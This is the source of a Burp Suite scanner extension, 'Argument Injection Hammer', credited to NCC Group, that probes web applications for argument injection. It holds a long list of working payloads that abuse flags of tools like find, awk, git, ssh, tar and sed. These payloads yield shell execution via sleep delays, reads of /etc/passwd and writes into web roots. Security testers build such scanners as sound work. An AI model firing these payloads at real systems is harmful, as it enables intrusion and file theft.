from burp import IBurpExtender
from burp import IScannerCheck
from burp import IScanIssue
from burp import ITab
from array import array
from java.io import PrintWriter
from java.lang import RuntimeException
from javax.swing import (GroupLayout, JPanel, JCheckBox, JTextField, JLabel, JButton)

import pickle
import time
import os
import binascii

TARGET_FILES = ["/etc/passwd", "file:///etc/passwd"]
TARGET_CONTENTS = ["root:x:0:0", "root:*:0:0"]
TARGET_DIRECTORIES = ["/var/www/html/", "/var/www/"]
TARGET_SHELL_DELAY = ["sleep${IFS}20", "sleep 20"]
PREFIXES = [("", False), ("test ", False), ("'", True),("\"", True)]
TIMEOUT = 20

PAYLOAD_SHELL = 0
PAYLOAD_WRITE = 1
PAYLOAD_READ = 2
PAYLOAD_LANG_DELAY = 3

PAYLOADS = [("{QUOTE_WITH_SPACE}-T --unzip-command {AH_SHELL}; {QUOTE}", PAYLOAD_SHELL, "zip"),
	("/dev/null{QUOTE} -exec {AH_SHELL} ; -type {QUOTE}f", PAYLOAD_SHELL, "find"),
	("{QUOTE_WITH_SPACE}* -exec {AH_SHELL} ; -type {QUOTE}f", PAYLOAD_SHELL, "find"),
	("{QUOTE_WITH_SPACE}-exec {AH_SHELL} ; -type {QUOTE}f", PAYLOAD_SHELL, "find"),
	("/)system(\"{AH_SHELL}\")match($0,/", PAYLOAD_SHELL, "awk"),
	("\")system(\"{AH_SHELL}\")sin(\"", PAYLOAD_SHELL, "awk"),
	("\"system(\"{AH_SHELL}\")\"", PAYLOAD_SHELL, "awk"),
	("{QUOTE_WITH_SPACE}{QUOTE}.shell {AH_SHELL}", PAYLOAD_SHELL, "sqlite3"),
	("{QUOTE_WITH_SPACE}--open-files-in-pager={QUOTE}{AH_SHELL}; ", PAYLOAD_SHELL, "git"),
	("--line-number{QUOTE} --open-files-in-pager={AH_SHELL}; {QUOTE}", PAYLOAD_SHELL, "git"),
	("{QUOTE_WITH_SPACE}@{QUOTE}{AH_FILE}", PAYLOAD_READ, "readelf"),
	("{QUOTE_WITH_SPACE}-a @{QUOTE}{AH_FILE}", PAYLOAD_READ, "readelf"),
	("\\! {AH_SHELL}", PAYLOAD_SHELL, "mysql"),
	("{QUOTE_WITH_SPACE}-e {QUOTE}SELECT/**/SLEEP(20)", PAYLOAD_LANG_DELAY, "mysql"),
	("{QUOTE_WITH_SPACE}-e SELECT/**/SLEEP(20) --prompt {QUOTE}", PAYLOAD_LANG_DELAY, "mysql"),
	("{QUOTE_WITH_SPACE}--excludefile {QUOTE}{AH_FILE}", PAYLOAD_READ, "nmap"),
	("{QUOTE_WITH_SPACE}-e {QUOTE}sleep(20)", PAYLOAD_LANG_DELAY, "perl/ruby"),
	("{QUOTE_WITH_SPACE}-e sleep(20) {QUOTE}", PAYLOAD_LANG_DELAY, "perl/ruby"),
	("{QUOTE_WITH_SPACE}-r {QUOTE}sleep(20);", PAYLOAD_LANG_DELAY, "php"),
	("/dev/null{QUOTE} -r {QUOTE}sleep(20);", PAYLOAD_LANG_DELAY, "php"),
	("/dev/null{QUOTE} -r sleep(20); {QUOTE}", PAYLOAD_LANG_DELAY, "php"),
	("{QUOTE_WITH_SPACE}-f /dev/null -r {QUOTE}sleep(20);", PAYLOAD_LANG_DELAY, "php"),
	("{QUOTE_WITH_SPACE}-w {QUOTE}{AH_FILE}", PAYLOAD_READ, "php-cgi"),
	("{QUOTE_WITH_SPACE}enc -in {QUOTE}{AH_FILE}", PAYLOAD_READ, "openssl"),
	("{QUOTE_WITH_SPACE}-in {QUOTE}{AH_FILE}", PAYLOAD_READ, "openssl"),
	("os.execute(string.char(115,108,101,101,112,32,50,48))", PAYLOAD_LANG_DELAY, "lua"),
	("{QUOTE}-os.execute(string.char(115,108,101,101,112,32,50,48))-{QUOTE}", PAYLOAD_LANG_DELAY, "lua"),
	("{QUOTE_WITH_SPACE}-e {QUOTE}os.execute(string.char(115,108,101,101,112,32,50,48))", PAYLOAD_LANG_DELAY, "lua"),
	("/dev/null{QUOTE} -e {QUOTE}os.execute(string.char(115,108,101,101,112,32,50,48))", PAYLOAD_LANG_DELAY, "lua"),
	("{QUOTE_WITH_SPACE}-e os.execute(string.char(115,108,101,101,112,32,50,48)) {QUOTE}", PAYLOAD_LANG_DELAY, "lua"),
	("{QUOTE_WITH_SPACE}-c {QUOTE}__import__(chr(111)+chr(115)).system(chr(115)+chr(108)+chr(101)+chr(101)+chr(112)+chr(32)+chr(50)+chr(48))", PAYLOAD_LANG_DELAY, "python"),
	("{QUOTE_WITH_SPACE}-c __import__(chr(111)+chr(115)).system(chr(115)+chr(108)+chr(101)+chr(101)+chr(112)+chr(32)+chr(50)+chr(48)) {QUOTE}", PAYLOAD_LANG_DELAY, "python"),
	("{QUOTE_WITH_SPACE}-o ProxyCommand={QUOTE}{AH_SHELL}", PAYLOAD_SHELL, "ssh"),
	("{QUOTE_WITH_SPACE}ProxyCommand={QUOTE}{AH_SHELL}", PAYLOAD_SHELL, "ssh"),
	("{QUOTE_WITH_SPACE}-o {QUOTE}{AH_FILE}", PAYLOAD_WRITE, "wget/curl/sort"),	
	("{QUOTE_WITH_SPACE}-f {QUOTE}{AH_FILE}", PAYLOAD_READ, "date"),
	("java.lang.Thread.sleep(20000)", PAYLOAD_LANG_DELAY, "jrunscript"),
	("{QUOTE}-java.lang.Thread.sleep(20000)-{QUOTE}", PAYLOAD_LANG_DELAY, "jrunscript"),
	("/dev/null{QUOTE} -e {QUOTE}java.lang.Thread.sleep(20000)", PAYLOAD_LANG_DELAY, "jrunscript"),		
	("{QUOTE_WITH_SPACE}-e java.lang.Thread.sleep(20000) {QUOTE}", PAYLOAD_LANG_DELAY, "jrunscript"),
	("{QUOTE_WITH_SPACE}-e {QUOTE}java.lang.Thread.sleep(20000)", PAYLOAD_LANG_DELAY, "jrunscript"),
	("{QUOTE_WITH_SPACE}--to-command={QUOTE}{AH_SHELL}", PAYLOAD_SHELL, "tar"),
	("test@example.org{QUOTE} -C/etc/passwd -X{QUOTE}{AH_FILE}", PAYLOAD_WRITE, "sendmail"),
	("{QUOTE_WITH_SPACE}-C/etc/passwd -X{QUOTE}{AH_FILE}", PAYLOAD_WRITE, "sendmail"),
	("{QUOTE_WITH_SPACE}{QUOTE}{AH_FILE}", PAYLOAD_READ, "grep"),
	("1e${IFS}exec${IFS}{AH_SHELL};", PAYLOAD_SHELL, "sed"),
	("test2/g;1e${IFS}exec${IFS}{AH_SHELL};", PAYLOAD_SHELL, "sed"),
	("test1/test2/g;1e${IFS}exec${IFS}{AH_SHELL};", PAYLOAD_SHELL, "sed")]

DEBUG = False

class BurpExtender(IBurpExtender, IScannerCheck, ITab):	

	def registerExtenderCallbacks(self, callbacks):
		self._callbacks = callbacks
		self._helpers = callbacks.getHelpers()
		self._stdout = PrintWriter(callbacks.getStdout(), True)

		callbacks.setExtensionName("Argument Injection Hammer")	
		self._create_brute_payloads()

		self._stdout.println('==================================')	
		self._stdout.println("        ,")
		self._stdout.println("       /(  ___________")
		self._stdout.println("      |  >:===========`")
		self._stdout.println("       )(")
		self._stdout.println('== AIH "" Hammer Smash Party =====')
		self._stdout.println('== Neil Bergman - NCC Group  =====')
		self._stdout.println('==================================')

		self._checkbox_brute = self._define_check_box("Brute-force Short Argument Flags", False)
		self._button_save = JButton("Save Configuration", actionPerformed=self._save_config)

		self.tab = JPanel()
		layout = GroupLayout(self.tab)
		self.tab.setLayout(layout)
		layout.setAutoCreateGaps(True)
		layout.setAutoCreateContainerGaps(True)
		layout.setHorizontalGroup(
			layout.createSequentialGroup().addGroup(
				layout.createParallelGroup()
				.addComponent(self._checkbox_brute)
				
			).addGroup(
				layout.createParallelGroup()
				.addComponent(self._button_save)
			)
		)
		layout.setVerticalGroup(
			layout.createSequentialGroup().addGroup(
				layout.createParallelGroup()
				.addComponent(self._checkbox_brute)
			).addGroup(
				layout.createParallelGroup()
				.addComponent(self._button_save)
			)
		)
		callbacks.addSuiteTab(self)
		self._restore_config()

		callbacks.registerScannerCheck(self)
		return

	def getTabCaption(self):
		return("Argument Injection Hammer")

	def getUiComponent(self):
		return self.tab
	
	def _define_check_box(self, caption, selected=True, enabled=True):
        	check_box = JCheckBox(caption)
        	check_box.setSelected(selected)
        	check_box.setEnabled(enabled)
        	return check_box

	def _get_matches(self, response, match):
	        matches = []
		start = 0
		reslen = len(response)
		matchlen = len(match)
		while start < reslen:
			start = self._helpers.indexOf(response, match, True, start, reslen)
			if start == -1:
				break
			matches.append(array('i', [start, start + matchlen]))
			start += matchlen
		return matches

	def _log(self, log_contents):
		if DEBUG:
			self._stdout.println(log_contents)	

	def _string_to_hex(self, string):
		return "".join("{:02x}".format(ord(c)) for c in string)

	def _restore_config(self, e=None):
		stored_config = self._callbacks.loadExtensionSetting("config")
		if stored_config != None:
			try:
				config = pickle.loads(stored_config)
				self._checkbox_brute.setSelected(config['bruteShortArgumentFlags'])
			except:
				print("Unable to restore saved configuration: " + stored_config)

	def _save_config(self, e=None):
		config = {'bruteShortArgumentFlags': self._checkbox_brute.isSelected()}
		self._callbacks.saveExtensionSetting("config", pickle.dumps(config))

	def _create_brute_payloads(self):
		BRUTE_CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

		for c in BRUTE_CHARSET:
			new_payload = "{QUOTE_WITH_SPACE}-" + c + " {QUOTE}{AH_FILE}"
			should_add_payload = True
			
			for payload_data in PAYLOADS:
				if payload_data[0] == new_payload:
					should_add_payload = False
			
			if should_add_payload:
				PAYLOADS.append((new_payload, PAYLOAD_READ, "Unknown"))

	def _make_http_request(self, baseRequestResponse, new_uri):
		http_service = baseRequestResponse.getHttpService()	
		host = http_service.getHost()
		port = http_service.getPort()			

		http_request = "GET /" + new_uri + " HTTP/1.1\r\nHost: " + host + ":" + str(port) + "\r\nConnection: close\r\n\r\n"
		http_request_bytes = self._helpers.stringToBytes(http_request)
		self._log("HTTP Request (Bytes): \n" + self._string_to_hex(self._helpers.bytesToString(http_request_bytes)))

		request_response = self._callbacks.makeHttpRequest(http_service, http_request_bytes)
		response_info = self._helpers.analyzeResponse(request_response.getResponse())
		return response_info

	def _get_write_up(self, injection_type, injection_command_target, injection, target_file):				
		if injection_type == PAYLOAD_READ:
			return ["Argument Injection - Arbitrary File Read",
				"An argument injection vulnerability was found in the target web application.  It appears that it is possible to manipulate arguments passed to the " + injection_command_target + " command, which can result in an arbitrary file read.  The following payload was used to read the " + target_file + " file.\n\nPayload: " + injection]
		elif injection_type == PAYLOAD_WRITE:
			return ["Argument Injection - Arbitrary File Write",
				"An argument injection vulnerability was found in the target web application.  It appears that it is possible to manipulate arguments passed to the " + injection_command_target + " command, which can result in an arbitrary file write.  The following payload was used to write the " + target_file + " file.\n\nPayload: " + injection]
		elif injection_type == PAYLOAD_SHELL:
			return ["Argument Injection - Shell Injection",
				"An argument injection vulnerability was found in the target web application.  It appears that it is possible to manipulate arguments passed to the " + injection_command_target + " command, which can result in an arbitrary command execution.  The following payload was used to introduce a delay in the response time.\n\nPayload: " + injection]
		elif injection_type == PAYLOAD_LANG_DELAY:
			return ["Argument Injection - Code Injection",
				"An argument injection vulnerability was found in the target web application.  It appears that it is possible to manipulate arguments passed to the " + injection_command_target + " command, which can result in an arbitrary code injection.  The following payload was used to introduce a delay in the response time.\n\nPayload: " + injection]
		return None

	def doPassiveScan(self, baseRequestResponse):
		return None

	def doActiveScan(self, baseRequestResponse, insertionPoint):
		for payload in PAYLOADS:
			injection = payload[0]
			injection_type = payload[1]
			injection_command_target = payload[2]

			if self._checkbox_brute.isSelected() == False and injection_command_target == "Unknown":
				# Ignore this type of payload if the user doesn't want to brute force short argument flags. 
				continue
		
			for prefix in PREFIXES:
				prefix_value = prefix[0]
				quote_prefix = prefix[1]

				if quote_prefix == True and "{QUOTE}" not in injection:
					# Don't test quote prefix if payload doesn't have quote placeholders.
					continue
				elif quote_prefix == True:
					# Replace the quote placeholders with actual quotes.
					temp_injection_1 = injection.replace("{QUOTE}", prefix_value)
					temp_injection_1 = temp_injection_1.replace("{QUOTE_WITH_SPACE}", prefix_value + " ")
				else:
					# Remove quote placeholders from payload.
					temp_injection_1 = injection.replace("{QUOTE}", "")
					temp_injection_1 = temp_injection_1.replace("{QUOTE_WITH_SPACE}", "")				
					temp_injection_1 = prefix_value + temp_injection_1		

				if injection_type == PAYLOAD_SHELL:
					for injection_replacement in TARGET_SHELL_DELAY:
						temp_injection_2 = temp_injection_1.replace("{AH_SHELL}", injection_replacement)
						self._log("Payload: " + temp_injection_2)

						checkRequest = insertionPoint.buildRequest(temp_injection_2)

						timer = time.time()
						checkRequestResponse = self._callbacks.makeHttpRequest(
							baseRequestResponse.getHttpService(), checkRequest)
						timer = time.time() - timer
						self._log("Response Time: " + str(timer))

						if timer > TIMEOUT:
							checkRequest_2 = insertionPoint.buildRequest("test")
							timer_2 = time.time()
							checkRequestResponse_2 = self._callbacks.makeHttpRequest(
							baseRequestResponse.getHttpService(), checkRequest_2)
							timer_2 = time.time() - timer_2
							self._log("Response Time: " + str(timer_2))

							if timer_2 < TIMEOUT:
								requestHighlights = [insertionPoint.getPayloadOffsets(temp_injection_2)]
								write_up = self._get_write_up(PAYLOAD_SHELL, injection_command_target, temp_injection_2, None)

								if write_up:
									return [CustomScanIssue(
										baseRequestResponse.getHttpService(),
										self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
										[self._callbacks.applyMarkers(checkRequestResponse, requestHighlights, [])],
										write_up[0], write_up[1], "High")]

				if injection_type == PAYLOAD_LANG_DELAY:
					self._log("Payload: " + temp_injection_1)
					checkRequest = insertionPoint.buildRequest(temp_injection_1)

					timer = time.time()
					checkRequestResponse = self._callbacks.makeHttpRequest(
						baseRequestResponse.getHttpService(), checkRequest)
					timer = time.time() - timer
					self._log("Response Time: " + str(timer))

					if timer > TIMEOUT:
						checkRequest2 = insertionPoint.buildRequest("test")
						timer2 = time.time()
						checkRequestResponse2 = self._callbacks.makeHttpRequest(
						baseRequestResponse.getHttpService(), checkRequest2)
						timer2 = time.time() - timer2
						self._log("Response Time: " + str(timer2))

						if timer2 < TIMEOUT:
							requestHighlights = [insertionPoint.getPayloadOffsets(temp_injection_1)]
							write_up = self._get_write_up(PAYLOAD_LANG_DELAY, injection_command_target, temp_injection_1, None)

							if write_up:
								return [CustomScanIssue(
									baseRequestResponse.getHttpService(),
									self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
									[self._callbacks.applyMarkers(checkRequestResponse, requestHighlights, [])],
									write_up[0], write_up[1], "High")]		

				if injection_type == PAYLOAD_WRITE:
					for target_directory in TARGET_DIRECTORIES:
						random_file = binascii.b2a_hex(os.urandom(10))
						target_file = target_directory + random_file					

						temp_injection_2 = temp_injection_1.replace("{AH_FILE}", target_file)
						temp_injection_bytes = bytearray(temp_injection_2)
						self._log("Payload: " + temp_injection_2)
					
						checkRequest = insertionPoint.buildRequest(temp_injection_2)
						checkRequestResponse = self._callbacks.makeHttpRequest(
							baseRequestResponse.getHttpService(), checkRequest)
						self._log("Original HTTP Request (Bytes): \n" + self._string_to_hex(self._helpers.bytesToString(checkRequest)))

						response_info = self._make_http_request(baseRequestResponse, random_file)
						response_status_code = response_info.getStatusCode()		
						self._log("Status: " + str(response_status_code))

						if response_status_code == 200:
							random_file_2 = binascii.b2a_hex(os.urandom(10))
							response_info_2 = self._make_http_request(baseRequestResponse, random_file_2)
							response_status_code_2 = response_info_2.getStatusCode()
							self._log("Status: " + str(response_status_code_2))

							if response_status_code_2 != 200:
								requestHighlights = [insertionPoint.getPayloadOffsets(temp_injection_2)]
								write_up = self._get_write_up(PAYLOAD_WRITE, injection_command_target, temp_injection_2, target_file)
								if write_up:
									return [CustomScanIssue(
										baseRequestResponse.getHttpService(),
										self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
										[self._callbacks.applyMarkers(checkRequestResponse, requestHighlights, [])],
										write_up[0], write_up[1], "High")]

				if injection_type == PAYLOAD_READ:
					for target_file in TARGET_FILES:
						temp_injection_2 = temp_injection_1.replace("{AH_FILE}", target_file)
						temp_injection_bytes = bytearray(temp_injection_2)
						self._log("Payload: " + temp_injection_2)
					
						checkRequest = insertionPoint.buildRequest(temp_injection_2)
						checkRequestResponse = self._callbacks.makeHttpRequest(
							baseRequestResponse.getHttpService(), checkRequest)

						for target_content in TARGET_CONTENTS:
							target_content_bytes = bytearray(target_content)
							matches = self._get_matches(checkRequestResponse.getResponse(), target_content_bytes)
							orig_matches = self._get_matches(baseRequestResponse.getResponse(), target_content_bytes)

							if len(matches) > 0 and len(orig_matches) == 0:
								requestHighlights = [insertionPoint.getPayloadOffsets(temp_injection_bytes)]
								write_up = self._get_write_up(PAYLOAD_READ, injection_command_target, temp_injection_2, target_file)
								
								if write_up:
									return [CustomScanIssue(
										baseRequestResponse.getHttpService(),
										self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
										[self._callbacks.applyMarkers(checkRequestResponse, requestHighlights, matches)],
										write_up[0], write_up[1], "High")]	

		return None

	def consolidateDuplicateIssues(self, existingIssue, newIssue):
		if existingIssue.getIssueName() == newIssue.getIssueName():
			return -1
		return 0

class CustomScanIssue (IScanIssue):
	def __init__(self, httpService, url, httpMessages, name, detail, severity):
		self._httpService = httpService
		self._url = url
		self._httpMessages = httpMessages
		self._name = name
		self._detail = detail
		self._severity = severity

	def getUrl(self):
		return self._url

	def getIssueName(self):
		return self._name

	def getIssueType(self):
		return 0

	def getSeverity(self):
		return self._severity

	def getConfidence(self):
		return "Certain"

	def getIssueBackground(self):
		pass

	def getRemediationBackground(self):
		pass

	def getIssueDetail(self):
		return self._detail

	def getRemediationDetail(self):
		pass

	def getHttpMessages(self):
		return self._httpMessages

	def getHttpService(self):
		return self._httpService
